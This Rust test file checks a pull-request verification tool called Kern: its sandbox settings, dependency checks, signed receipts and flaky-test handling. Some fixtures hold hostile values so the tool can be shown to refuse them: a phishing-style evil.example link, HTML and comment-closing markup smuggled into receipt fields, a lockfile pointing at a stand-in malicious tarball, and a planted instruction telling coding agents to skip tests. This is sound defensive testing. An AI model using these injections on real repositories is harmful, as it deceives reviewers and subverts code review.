    assert!(!home.starts_with("/workspace"), "apify/camoufox-js#254, storybook#36653: under /workspace, the project's \"type\": \"module\" made Node load yarn 4's yarn.js as ESM and every install failed with Dynamic require of \"util\" is not supported");
    assert!(home.starts_with("/home/kern/"), "the setup sandbox's home is its writable scratch space");
}

#[test]
fn on_a_throwaway_machine_packages_install_the_way_ci_installs_them_with_their_scripts() {
    let t = Temp::new();
    write(&t.0, "package.json", r#"{"name":"app"}"#);
    write(&t.0, "package-lock.json", "{}");
    let sealed = kern::sandbox::install_plan_for(&t.0, false).1;
    assert!(sealed.iter().all(|(argv, _)| argv.iter().any(|a| a == "--ignore-scripts")), "under gVisor no package script runs: {sealed:?}");
    let ci = kern::sandbox::install_plan_for(&t.0, true).1;
    let (with, without): (Vec<_>, Vec<_>) = ci.iter().partition(|(_, said)| *said != kern::sandbox::UNSCRIPTED);
    assert!(!with.is_empty() && with.iter().all(|(argv, _)| !argv.iter().any(|a| a == "--ignore-scripts")), "canvas, prisma and mongodb-memory-server finish installing only through their scripts: {ci:?}");
    assert_eq!(without.len(), sealed.len(), "when a package's script fails (no compiler in the image, say), the install falls back to what gVisor mode does, so it never gets worse");
    assert!(without.iter().all(|(argv, _)| argv.iter().any(|a| a == "--ignore-scripts")) && ci.iter().position(|(_, s)| *s == kern::sandbox::UNSCRIPTED) == Some(with.len()), "{ci:?}");
    let u = Temp::new();
    write(&u.0, "package.json", r#"{"name":"app","packageManager":"yarn@4.9.2"}"#);
    write(&u.0, ".yarnrc.yml", "nodeLinker: node-modules\n");
    write(&u.0, "yarn.lock", "__metadata:\n  version: 8\n");
    assert!(kern::sandbox::install_plan_for(&u.0, true).1.iter().filter(|(_, said)| *said != kern::sandbox::UNSCRIPTED).all(|(argv, _)| !argv.iter().any(|a| a == "--mode=skip-build")));
    let v = Temp::new();
    write(&v.0, "package.json", r#"{"name":"app"}"#);
    write(&v.0, "pnpm-lock.yaml", "lockfileVersion: '9.0'\n");
    assert!(kern::sandbox::install_plan_for(&v.0, true).1.iter().filter(|(_, said)| *said != kern::sandbox::UNSCRIPTED).all(|(argv, _)| !argv.iter().any(|a| a == "--ignore-scripts" || a == "--ignore-pnpmfile")));
}

#[test]
fn runc_is_accepted_only_on_a_machine_its_policy_calls_throwaway() {
    let t = Temp::new();
    let tool = t.0.join("tool");
    std::fs::write(&tool, "pinned-tool-fixture").unwrap();
    let pin = |p: &Path| json!({ "file": p, "sha256": kern::util::sha256(std::fs::read(p).unwrap()) });
    let policy = |text: &str| { let p = t.0.join(format!("policy-{}.json", kern::util::sha256(text.as_bytes()))); std::fs::write(&p, text).unwrap(); pin(&p) };
    let control = |runtime: Value, host: Value| json!({ "version": 1, "role": "verifier", "docker": { "file": tool, "sha256": pin(&tool)["sha256"], "endpoint": policy::ENDPOINT },
        "git": pin(&tool), "host_policy": host, "runtime": runtime });
    let runc = json!({ "file": "/usr/bin/runc", "sha256": "a".repeat(64), "version": "runc version 1.2.5", "arguments": [], "name": "runc" });
    let kept = policy(r#"{"host":"github-actions","deployment":"single-vm"}"#);
    let refused = policy::validate_control(&control(runc.clone(), kept)).unwrap_err();
    assert!(refused.0.contains("throwaway machine"), "a machine that is kept between checks needs gVisor: {}", refused.0);
    let throwaway = policy(r#"{"host":"github-actions","deployment":"single-vm","machine":"throwaway"}"#);
    assert_eq!(policy::validate_control(&control(runc.clone(), throwaway.clone())).unwrap().runtime_name, "runc");
    let mut other = runc.clone();
    other["name"] = json!("kata");
    assert!(policy::validate_control(&control(other, throwaway.clone())).is_err());
    let plain = json!({ "file": "/usr/local/bin/runsc", "sha256": "a".repeat(64), "version": "fixture", "arguments": [] });
    assert_eq!(policy::validate_control(&control(plain, throwaway)).unwrap().runtime_name, "runsc", "gVisor stays the default");
    let limits = kern::policy::Limits { files_changed: 1, lines_changed: 1, file_bytes: 1, total_bytes: 1 << 20, timeout_seconds: 60, memory_mb: 512, pids: 64 };
    let spec = kern::sandbox::Spec { image: "sha256:x", snapshot: &t.0, control: &t.0, writable: &[], limits: &limits, entry: vec!["__drive_test".into()], network: "none", volumes: vec![],
        root: false, home_mb: 0, scratch: false, workspace: Some(("kern-deps-x", false)) };
    let args = kern::sandbox::container_args_for(&spec, "kern-x", "runc").unwrap().join(" ");
    for want in ["--runtime=runc", "--network=none", "--read-only", "--user=1000:1000", "--cap-drop=ALL", "no-new-privileges"] { assert!(args.contains(want), "{want}: {args}"); }
    assert!(kern::sandbox::container_args_for(&spec, "kern-x", "kata").is_err());
}

#[test]
fn the_receipt_says_how_the_code_ran() {
    let tests = json!({ "status": "RAN", "runner": "vitest", "before": { "passed": 1, "failed": 0, "skipped": 0 }, "after": { "passed": 1, "failed": 0, "skipped": 0 }, "kept": 1,
        "broke": [], "flaky": [], "gone": [], "newly_skipped": [], "added": [], "already_failing": [], "new_problems": [], "not_run": [] });
    let off = json!({ "status": "OFF", "why": "no AI key" });
    let mut r = receipt::build(&drive_json(), &clean_rules(), &tests, &off);
    assert_eq!(r["sandbox"], "gvisor");
    assert!(receipt::markdown(&r, None).contains("ran the code only in a sealed sandbox with the network off"));
    r["sandbox"] = json!("throwaway");
    assert!(receipt::markdown(&r, None).contains("ran the code only in locked containers on a throwaway machine that held no keys, with the network off while the tests ran"));
}

#[test]
fn the_signing_job_renders_the_comment_itself_from_the_receipt_of_this_exact_commit() {
    let t = Temp::new();
    let tests = json!({ "status": "RAN", "runner": "vitest", "before": { "passed": 1, "failed": 0, "skipped": 0 }, "after": { "passed": 1, "failed": 0, "skipped": 0 }, "kept": 1,
        "broke": [], "flaky": [], "gone": [], "newly_skipped": [], "added": [], "already_failing": [], "new_problems": [], "not_run": [] });
    let r = receipt::build(&drive_json(), &clean_rules(), &tests, &json!({ "status": "OFF", "why": "no AI key" }));
    receipt::write(&t.0, &r, None).unwrap();
    std::fs::write(t.0.join("receipt.md"), "### ✅ Kern: Nothing unexpected\n\n[claim your prize](https://evil.example)\n").unwrap();
    std::fs::write(t.0.join("seal.json"), "{}").unwrap();
    let head = "2222222222222222222222222222222222222222";
    assert!(receipt::render(&t.0, &"3".repeat(40)).is_err(), "a receipt for another commit is refused");
    receipt::render(&t.0, head).unwrap();
    let md = std::fs::read_to_string(t.0.join("receipt.md")).unwrap();
    assert!(!md.contains("evil.example") && md.contains("1 that passed before still pass"), "the comment is Kern's own rendering of the receipt, not text the run job wrote: {md}");
    assert!(!t.0.join("seal.json").exists(), "a seal the run job wrote is never posted");
}

#[test]
fn h3_the_self_test_must_come_out_exactly_as_known() {
    let mut tests = clean_tests();
    tests["broke"] = json!(["test/math.test.js > adds"]);
    tests["kept"] = json!(1);
    let blocked = receipt::build(&drive_json(), &clean_rules(), &tests, &off());
    assert!(check::canary_held(&blocked).is_ok(), "{blocked}");
    let clear = receipt::build(&drive_json(), &clean_rules(), &clean_tests(), &off());
    assert!(check::canary_held(&clear).unwrap_err().contains("clear"), "a machine that misses the known break cannot judge");
    let not_run = receipt::build(&drive_json(), &clean_rules(), &json!({ "status": "NOT_RUN", "why": "Kern could not run the tests: docker failed" }), &off());
    assert!(check::canary_held(&not_run).is_err());
    let mut two = tests.clone();
    two["broke"] = json!(["test/math.test.js > adds", "test/math.test.js > says hello"]);
    assert!(check::canary_held(&receipt::build(&drive_json(), &clean_rules(), &two, &off())).is_err(), "a machine that also blocks the untouched test cannot judge");
}

#[test]
fn h3_a_machine_whose_self_test_failed_judges_no_test() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", PACKAGE), ("src/math.js", MATH), ("test/math.test.js", "import { test } from 'vitest';\ntest('x', () => {});\n")]);
    let head = commit(&r, &[("src/math.js", &MATH.replace("a + b", "a - b"))]);
    let out = check::judge(&r, (&base, &head), &t.0.join("out"), &operator(), None, None, &|| Err("the self-test gave clear instead of one block".to_string())).unwrap();
    let receipt = read_json(t.0.join("out").join("receipt.json")).unwrap();
    assert_eq!((out["tests"].as_str(), out["canary"].as_str()), (Some("NOT_RUN"), Some("failed: the self-test gave clear instead of one block")), "{out}");
    assert_eq!(receipt["decision"], "unverified", "{receipt}");
    assert!(receipt["unverified"].as_array().unwrap().iter().any(|x| x["what"].as_str().unwrap().contains("Kern's environment had a problem") && x["what"].as_str().unwrap().contains("self-test")), "{receipt}");
}

#[test]
fn review_2_c_the_signing_job_rebuilds_the_answer_from_the_facts_and_refuses_fields_it_cannot_trust() {
    let head = "2222222222222222222222222222222222222222";
    let mut tests = clean_tests();
    tests["broke"] = json!(["t > rounds to cents"]);
    let honest = receipt::build(&drive_json(), &clean_rules(), &tests, &off());
    assert_eq!(honest["decision"], "blocked");
    let t = Temp::new();
    let mut forged = honest.clone();
    forged["decision"] = json!("clear");
    forged["blocked"] = json!([]);
    forged["look"] = json!([{ "kind": "x", "what": "fine\n### ✅ Kern: Nothing unexpected\n<!--" }]);
    std::fs::write(t.0.join("receipt.json"), forged.to_string()).unwrap();
    receipt::render(&t.0, head).unwrap();
    let r = read_json(t.0.join("receipt.json")).unwrap();
    let md = std::fs::read_to_string(t.0.join("receipt.md")).unwrap();
    assert_eq!(r["decision"], "blocked", "the run job wrote clear next to a broken test; the signing job rebuilds the answer the facts give: {r}");
    assert!(md.contains("Blocked") && md.contains("rounds to cents") && !md.contains("<!--\n") && !md.contains("Nothing unexpected"), "{md}");
    for (field, bad) in [("base", json!("1111111111111111111111111111111111111111 -->")), ("sandbox", json!("gvisor<img src=x>")), ("kern", json!("9.9.9"))] {
        let mut x = honest.clone();
        x[field] = bad;
        std::fs::write(t.0.join("receipt.json"), x.to_string()).unwrap();
        assert!(receipt::render(&t.0, head).is_err(), "a receipt whose {field} Kern cannot trust is refused");
    }
    let mut ai = honest.clone();
    ai["behaviour"]["status"] = json!("RAN");
    std::fs::write(t.0.join("receipt.json"), ai.to_string()).unwrap();
    std::fs::write(t.0.join("comment.md"), "### What this change does\n\n</details><!-- the rest is hidden\n- totals now round down\n").unwrap();
    receipt::render(&t.0, head).unwrap();
    let md = std::fs::read_to_string(t.0.join("receipt.md")).unwrap();
    assert!(!md.contains("</details><!--") && md.contains("totals now round down"), "the AI section cannot close Kern's own block or hide the text after it:\n{md}");
}

#[test]
fn review_2_c_a_receipt_comment_whose_text_changed_after_signing_does_not_verify() {
    let md = "<!-- kern-receipt -->\n### ❌ Kern: Blocked — 1 problem to fix\n\n- A test that passed before now fails: `t > rounds to cents`\n";
    let seal = json!({ "v": 1, "markdown_sha256": receipt::text_digest(md) });
    let body = format!("{md}<sub>Signed by GitHub for Kern's own workflow. Anyone can check this receipt: `kern receipt verify acme/shop 7`</sub>\n<!-- kern-seal {{}} -->");
    assert!(receipt::comment_matches(&seal, &body));
    assert!(!receipt::comment_matches(&seal, &body.replace("❌ Kern: Blocked — 1 problem to fix", "✅ Kern: Nothing unexpected")), "someone with write access edited the text to read clear");
    assert!(receipt::comment_matches(&seal, &body.replace("<!-- kern-seal", "\n**Approved by @maria** on 2026-10-17: every item above was looked at.\n<!-- kern-seal")), "Kern's own approval note sits after the signed text");
    assert!(receipt::comment_matches(&json!({ "v": 1 }), &body.replace("Blocked", "Fine")), "a seal from before the text digest is checked by its signature only");
}

#[test]
fn review_2_a2_and_a9_dependencies_are_routine_only_when_every_changed_file_and_every_move_is_explained() {
    let bump = json!({ "path": "package.json", "operation": "modify", "packages": ["vitest"], "moves": [{ "name": "vitest", "from": "^3.2.0", "to": "^3.2.4", "age": "routine", "version": "3.2.4" }] });
    let decide = |deps: Value| -> (Value, String) {
        let mut rules = clean_rules();
        rules["dependencies"] = deps;
        let r = receipt::build(&drive_json(), &rules, &clean_tests(), &off());
        let md = receipt::markdown(&r, None);
        (r["decision"].clone(), md)
    };
    let (alone, md) = decide(json!([bump.clone()]));
    assert!(alone == "clear" && md.contains("✅ Dependencies"), "a routine bump on its own stays routine:\n{md}");
    for other in ["pnpm-lock.yaml", "yarn.lock", "bun.lock", "requirements.txt"] {
        let (decision, md) = decide(json!([bump.clone(), { "path": other, "operation": "modify" }]));
        assert_eq!(decision, "look", "{other} could point at https://evil.example/x.tgz, and Kern does not read it:\n{md}");
        assert!(!md.contains("✅ Dependencies") && md.contains(other), "{md}");
    }
    let lock = json!({ "path": "package-lock.json", "operation": "modify", "moves": [{ "name": "vitest", "from": "3.2.0", "to": "3.2.4", "lock": true, "age": "routine" },
        { "name": "tiny-helper", "from": "1.0.0", "to": "1.0.1", "lock": true, "age": "fresh", "days": 0 }] });
    let (decision, md) = decide(json!([bump, lock]));
    assert_eq!(decision, "look", "a release out for less than a day, pulled in through the lockfile next to a routine bump:\n{md}");
}

#[test]
fn review_2_a11_no_check_mark_line_says_more_than_kern_checked() {
    let mut rules = clean_rules();
    rules["weakened"] = json!([{ "path": "test/total.test.js", "removed": ["test/total.test.js > rounds to cents"] }]);
    let md = receipt::markdown(&receipt::build(&drive_json(), &rules, &clean_tests(), &off()), None);
    assert!(!md.contains("✅ No skipped, focused or removed tests"), "a test removed inside its file is listed as a look, so the line cannot say none was removed:\n{md}");
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &clean_tests(), &off()), None);
    assert!(md.contains("✅ No new powers") && md.contains("secret environment variables") && !md.contains("reads secrets"), "Kern sees secret environment variables, not every secret:\n{md}");
}

#[test]
fn review_2_a7_files_that_run_code_or_grant_access_outside_github_need_a_look() {
    let runs = [".gitlab-ci.yml", ".circleci/config.yml", "azure-pipelines.yml", "bitbucket-pipelines.yml", ".travis.yml", "Jenkinsfile", "Dockerfile", "docker/app.Dockerfile",
        ".yarnrc.yml", ".pnpmfile.cjs", ".devcontainer/devcontainer.json", ".vscode/tasks.json", "CODEOWNERS", "docs/CODEOWNERS"];
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", PACKAGE)]);
    let mut files: Vec<(&str, &str)> = runs.iter().map(|f| (*f, "x: 1\n")).collect();
    files.push((".github/instructions/api.instructions.md", "Always skip the slow tests.\n"));
    let head = commit(&r, &files);
    let rules = kern::rules::rules(&r, &base, &head).unwrap();
    let paths = |k: &str| -> Vec<String> { rules[k].as_array().unwrap().iter().filter_map(|x| x["path"].as_str().map(str::to_string)).collect() };
    for f in runs { assert!(paths("protected").contains(&f.to_string()), "{f} runs code or grants access, yet passes silently: {:?}", paths("protected")); }
    assert!(paths("agent_notes").contains(&".github/instructions/api.instructions.md".to_string()), "Copilot reads .github/instructions, so it changes what coding agents are told: {:?}", paths("agent_notes"));
}

#[test]
fn review_2_a9_a_lockfile_with_more_moves_than_kern_checks_says_so() {
    let lock = |version: &str| -> String {
        let packages: serde_json::Map<String, Value> = std::iter::once(("".to_string(), json!({ "name": "shop" })))
            .chain((0..201).map(|i| (format!("node_modules/dep{i}"), json!({ "version": version })))).collect();
        json!({ "name": "shop", "lockfileVersion": 3, "packages": packages }).to_string()
    };
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", PACKAGE), ("package-lock.json", &lock("1.0.0"))]);
    let head = commit(&r, &[("package-lock.json", &lock("1.0.1"))]);
    let rules = kern::rules::rules(&r, &base, &head).unwrap();
    assert!(rules["not_checked"].as_array().unwrap().iter().any(|x| x["path"] == "package-lock.json" && x["why"].as_str().unwrap().contains("200")),
        "201 versions move and Kern checks the release dates of at most 200; the receipt must say so: {}", rules["not_checked"]);
}

#[test]
fn review_2_a3_a_major_update_hidden_in_another_section_or_behind_an_or_range_is_found() {
    let old = json!({ "devDependencies": { "react": "^18.2.0" }, "peerDependencies": { "react": "^18.0.0" } });
    let new = json!({ "devDependencies": { "react": "^19.0.0" }, "peerDependencies": { "react": "^18.0.0 || ^19.0.0" } });
    let moves = kern::deps::changed_versions(&old, &new);
    assert_eq!(moves.len(), 2, "each section's move is kept: {moves:?}");
    for m in &moves {
        assert_eq!(kern::deps::age(m["from"].as_str(), m["to"].as_str(), &|_| Some(0), 100 * 86_400)["age"], "major", "react 18 to 19 is a major update in every section: {m}");
    }
}

#[test]
fn review_2_a4_the_pull_request_cannot_set_the_clock_that_ages_its_dependencies() {
    let t = Temp::new();
    let (r, _) = repo(&t, &[("package.json", PACKAGE)]);
    write(&r, "src/a.js", "export const a = 1;\n");
    git(&r, &["add", "-A"]);
    let out = Command::new("git").args(["commit", "-q", "-m", "future"]).current_dir(&r).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_COMMITTER_DATE", "2099-01-01T00:00:00Z").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success());
    let head = git(&r, &["rev-parse", "HEAD"]);
    assert!(check::clock(&r, &head) <= now_ms() / 1000 + 5, "a commit dated 2099 would make an hour-old release look a week old");
}

#[test]
fn the_untouched_tests_watch_runs_on_its_own_when_planted_faults_cannot_and_is_dropped_first_when_they_compete() {
    let both = suite::FAULTS_SECS_MAX + suite::BYSTANDER_SECS_MIN + suite::TYPES_SECS_RESERVE;
    assert_eq!(suite::after_tests(both), (true, true), "with time for the faults, the watch and the type check, all three run");
    assert_eq!(suite::after_tests(both - 1), (true, false), "when the faults and the watch compete, the watch is dropped first (CLAUDE.md)");
    let control_only = suite::CONTROL_SECS_MAX + suite::BYSTANDER_SECS_MIN + suite::TYPES_SECS_RESERVE;
    assert!(!suite::faults_fit(control_only) || control_only >= suite::FAULTS_SECS_MIN + suite::TYPES_SECS_RESERVE);
    for left in 0..=3600u64 {
        let (plant, watch) = suite::after_tests(left);
        if !plant && left >= control_only { assert!(watch, "with {left} seconds left the faults do not fit, but a control run and the watch do: on the 708-PR benchmark the watch ran on only half the pull requests because it waited for the faults"); }
        if watch { assert!(suite::bystanders_fit(left.saturating_sub(if plant { suite::fault_seconds(left) } else { suite::CONTROL_SECS_MAX })), "the watch never runs into the type check's time"); }
        if plant { assert!(suite::types_fit(left), "{left}"); }
    }
}

#[test]
fn h4_when_time_runs_short_planted_faults_go_first_then_the_type_check_and_dropped_work_is_listed_as_not_checked() {
    for left in 0..=3600u64 { assert!(!suite::faults_fit(left) || suite::types_fit(left), "with {left} seconds left the planted faults would run while the type check could not"); }
    assert!(suite::faults_fit(suite::FAULTS_SECS_MIN + suite::TYPES_SECS_RESERVE) && !suite::faults_fit(suite::FAULTS_SECS_MIN + suite::TYPES_SECS_RESERVE - 1));
    assert!(suite::types_fit(suite::TYPES_SECS_MIN) && !suite::types_fit(suite::TYPES_SECS_MIN - 1));
    let mut t = clean_tests();
    t["dropped"] = json!(["planted faults"]);
    t["types"] = json!({ "status": "NOT_RUN", "why": "Kern's time ran out before it could check the TypeScript types" });
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &t, &off()), None);
    assert!(md.contains("⏭️ Planted faults: not checked") && md.contains("⏭️ Types: not checked") && md.contains("time ran out"), "{md}");
    assert!(!md.contains("✅ Types") && !md.contains("✅ Planted faults"), "{md}");
}

#[test]
fn a_project_with_no_test_script_is_said_plainly_and_one_kern_cannot_run_is_not_verified() {
    let run = |package: &str| -> Value {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", package), ("src/total.js", "export const total = 1;\n")]);
        let head = commit(&r, &[("src/total.js", "export const total = 2;\n")]);
        check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap();
        read_json(t.0.join("out").join("receipt.json")).unwrap()
    };
    for package in [r#"{"name":"shop"}"#, r#"{"name":"shop","scripts":{"test":"echo \"Error: no test specified\" && exit 1"}}"#] {
        let none = run(package);
        assert_eq!((none["decision"].clone(), none["tests"]["no_tests"].clone()), (json!("clear"), json!(true)), "{package}: {none}");
    }
    let ava = run(r#"{"name":"shop","scripts":{"test":"ava"}}"#);
    assert_eq!(ava["decision"], "unverified", "the project has tests Kern cannot run, so its answer cannot be a green check: {ava}");
    assert!(ava["tests"]["why"].as_str().unwrap().contains("ava"), "{ava}");
}

#[test]
fn review_2_a5_tests_that_could_not_run_on_changed_code_never_give_a_green_check() {
    for why in ["Kern could not run the tests: Sandbox unavailable: docker failed", "the tests could not run on the old code: installing its dependencies with pnpm failed: Error: Cannot find module '/home/kern/corepack/v1/pnpm/12.14.0/bin/pnpm.cjs'",
        suite::LATE, "the tests on the old code gave no results: the output contains no mocha report (exit 1); the last lines it printed: Error: No test files found"] {
        let t = json!({ "status": "NOT_RUN", "why": why, "not_run": [] });
        let r = receipt::build(&drive_json(), &clean_rules(), &t, &off());
        assert_eq!(r["decision"], "unverified", "farm 16 ended 9 such checks with a green check though no test ran ({why}): {r}");
        assert!(r["unverified"].as_array().unwrap().iter().any(|x| x["kind"] == "tests-not-run"), "{r}");
    }
    let mut t = clean_tests();
    t["not_run"] = json!([{ "dir": "apps/web", "why": "Kern runs the tests of at most 5 packages per change" }]);
    assert_eq!(receipt::build(&drive_json(), &clean_rules(), &t, &off())["decision"], "unverified", "a changed package whose tests did not run");
    let none = json!({ "status": "NOT_RUN", "why": "the project has no test script, so no test checks this change", "no_tests": true, "not_run": [] });
    let r = receipt::build(&drive_json(), &clean_rules(), &none, &off());
    assert_eq!(r["decision"], "clear", "a project with no tests at all would need a look on every pull request, which tells nobody anything: {r}");
    assert!(!receipt::markdown(&r, None).contains("✅ Tests"), "{}", receipt::markdown(&r, None));
}

#[test]
fn review_a2_every_way_kern_can_set_up_the_two_sides_differently_by_accident_is_named() {
    let n = |major: u64| json!({ "major": major, "from": format!(".nvmrc says {major}") });
    let side = |result: &str, scripts: bool, node: Value, browser: Value| json!({ "installs": [{ "dir": ".", "manager": "npm", "result": result, "parts": [] }], "scripts": scripts, "node": node, "browser": browser });
    let setup = |old: Value, new: Value| json!({ "version": 1, "old": old, "new": new });
    let even = setup(side("installed", true, n(22), Value::Null), side("installed", true, n(22), Value::Null));
    assert_eq!(suite::setup_differs(&even, ""), None);
    let scripts = setup(side("installed", true, n(22), Value::Null), side("installed", false, n(22), Value::Null));
    assert!(suite::setup_differs(&scripts, "").is_some_and(|w| w.contains("install scripts")), "one side ran out of memory and was installed again without its install scripts");
    let fell = json!({ "major": 22, "wanted": 20, "from": ".nvmrc says 20", "why": "docker failed (1): toomanyrequests" });
    let node = setup(side("installed", true, n(20), Value::Null), side("installed", true, fell, Value::Null));
    assert!(suite::setup_differs(&node, "").is_some_and(|w| w.contains("Node")), "the new side could not pull Node 20 and ran on the default Node 22");
    assert_eq!(suite::setup_differs(&setup(side("installed", true, n(20), Value::Null), side("installed", true, n(22), Value::Null)), ""), None, "the PR moved .nvmrc from 20 to 22: that is the change being tested");
    let browser = setup(side("installed", true, n(22), json!({ "why": "the project uses playwright", "playwright": ["1.49.1"] })), side("installed", true, n(22), json!({ "why": "the project uses playwright", "playwright": ["1.49.1"], "error": "docker failed: timed out" })));
    assert!(suite::setup_differs(&browser, "").is_some_and(|w| w.contains("browser")));
    let lock = setup(side("installed without its packages' install scripts, because they failed", true, n(22), Value::Null), side("installed from package.json (the lockfile is out of date)", true, n(22), Value::Null));
    assert!(suite::setup_differs(&lock, "").is_some(), "review A2(d): the old side installed from its lockfile and the new side without one");
    let relaxed = setup(side("installed from package.json (the lockfile is out of date)", true, n(22), Value::Null), side("installed from package.json (the lockfile is out of date and npm's peer dependency checks were relaxed)", true, n(22), Value::Null));
    assert!(suite::setup_differs(&relaxed, "").is_some(), "review A2(e): both start with 'installed from package.json' but the new side ignored the lockfile");
    let mut drift = even.clone();
    drift["old"]["image"] = json!(format!("sha256:{}", "a".repeat(64)));
    drift["new"]["image"] = json!(format!("sha256:{}", "b".repeat(64)));
    assert!(suite::setup_differs(&drift, "").is_some_and(|w| w.contains("image")), "review B: the same node:22 tag pulled twice gave two different builds");
}

#[test]
fn review_a2b_a_node_image_that_cannot_be_pulled_comes_from_the_copy_on_disk() {
    let local = || Ok(format!("sha256:{}", "c".repeat(64)));
    assert_eq!(kern::sandbox::pulled_or_kept(Err(Denied("docker failed (1): toomanyrequests: You have reached your pull rate limit".into())), local).unwrap(), format!("sha256:{}", "c".repeat(64)),
        "Docker Hub refused the pull, but the image is already on this machine, so both sides still run the Node they ask for");
    assert!(kern::sandbox::pulled_or_kept(Err(Denied("docker failed (1): toomanyrequests".into())), || Err(Denied("No such image".into()))).is_err(), "no pull and no copy: say so, never guess");
    assert_eq!(kern::sandbox::pulled_or_kept(Ok(()), local).unwrap(), format!("sha256:{}", "c".repeat(64)));
}

fn listed(c: &Value, key: &str) -> Vec<String> { c[key].as_array().into_iter().flatten().filter_map(|x| x.as_str().map(str::to_string)).collect() }

#[test]
fn babylonjs_18161_a_test_in_a_file_that_was_flaky_in_the_same_check_cannot_prove_a_break() {
    let file = "packages/dev/loaders/test/unit/Interactivity/flow nodes.test.ts";
    let (gate, throttle, delay) = (format!("{file} > Flow Nodes > flow/multiGate with random"), format!("{file} > Flow Nodes > flow/throttle"), format!("{file} > Flow Nodes > flow/cancelDelay"));
    let other = "src/other.test.ts > adds";
    let all = |g: (u32, u32), t: (u32, u32), d: (u32, u32), o: (u32, u32)| report(&[(&gate, g.0, g.1, 0), (&throttle, t.0, t.1, 0), (&delay, d.0, d.1, 0), (other, o.0, o.1, 0)], &[]);
    let (pass, fail) = ((1, 0), (0, 1));
    let c = suite::verdict(&all(pass, pass, pass, pass), &all(fail, fail, fail, fail), Some(&all(fail, pass, pass, fail)), Some(&all(fail, pass, fail, fail)), Some(&all(pass, pass, pass, pass)), false, false);
    assert_eq!(listed(&c, "broke"), [other], "{c}");
    assert_eq!(listed(&c, "unsteady"), [gate], "BabylonJS#18161 was blocked on a timing test whose file flipped other tests in the same check: {c}");
}

#[test]
fn a_test_that_passes_when_the_whole_suite_runs_again_cannot_prove_a_break_even_after_failing_alone() {
    let (api, pool) = ("src/api.test.ts > answers", "src/db.test.ts > keeps one pool");
    let both = |a: (u32, u32), p: (u32, u32)| report(&[(api, a.0, a.1, 0), (pool, p.0, p.1, 0)], &[]);
    let (pass, fail) = ((1, 0), (0, 1));
    let c = suite::verdict(&both(pass, pass), &both(fail, fail), Some(&both(fail, pass)), Some(&both(pass, fail)), Some(&both(pass, pass)), false, false);
    assert!(listed(&c, "broke").is_empty(), "the api test passed in one of the three new runs, so the change cannot have broken it for sure: {c}");
    assert_eq!(listed(&c, "unsteady"), [api], "{c}");
    assert_eq!(listed(&c, "together"), [pool], "{c}");
}

#[test]
fn a_hook_that_fails_in_a_file_that_was_flaky_in_the_same_check_cannot_prove_a_break() {
    let (answers, retries) = ("test/server.test.js > answers", "test/server.test.js > retries");
    let hook = "test/server.test.js > \"after all\" hook in \"server\"";
    let run = |r: (u32, u32), problems: &[&str]| report(&[(answers, 1, 0, 0), (retries, r.0, r.1, 0)], problems);
    let (pass, fail) = ((1, 0), (0, 1));
    let c = suite::verdict(&run(pass, &[]), &run(fail, &[hook]), Some(&run(pass, &[hook])), Some(&run(pass, &[hook])), Some(&run(pass, &[])), false, false);
    assert!(listed(&c, "new_problems").is_empty(), "a teardown hook failing in a file whose tests pass and fail by chance is no proof: {c}");
    assert_eq!(listed(&c, "unsteady"), [hook], "{c}");
}

#[test]
fn a_receipt_never_shows_a_tests_check_mark_next_to_failures_it_could_not_prove() {
    for kind in ["unsteady", "uneven", "unproven", "sandbox"] {
        let mut t = clean_tests();
        t[kind] = json!(["src/total.test.ts > adds"]);
        let r = receipt::build(&drive_json(), &clean_rules(), &t, &off());
        let md = receipt::markdown(&r, None);
        assert_eq!(r["decision"], "unverified", "{kind}: {r}");
        assert!(!md.contains("- ✅ Tests:"), "{kind}: a test fails on the new code and Kern could not prove why, so the Tests line cannot carry a check mark:\n{md}");
    }
}
